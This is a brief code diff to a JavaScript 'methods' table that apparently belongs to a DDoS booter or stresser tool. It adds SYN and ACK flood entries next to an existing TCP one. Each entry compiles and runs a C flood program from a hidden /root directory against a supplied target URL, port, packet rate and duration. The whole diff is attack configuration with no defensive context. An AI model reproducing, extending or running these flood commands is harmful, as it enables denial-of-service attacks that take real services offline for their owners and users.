@@ -52,6 +52,14 @@ let methods = {
         TCP: {
             Command: 'cd /root/.xyran && gcc tcp.c -o tcp && ./tcp {url} {port} 3 {time}',
             Type: 'layer4'
+        },
+        SYN: {
+            Command: 'cd /root/.xyran && gcc syn.c -o syn && ./syn {url} {port} 3 25500 {time}',
+            Type: 'layer4'
+        },
+        ACK: {
+            Command: 'cd /root/.xyran && gcc ack.c -o ack && ./ack {url} {port} 3 25500 {time}',
+            Type: 'layer4'
         }
     }
 };
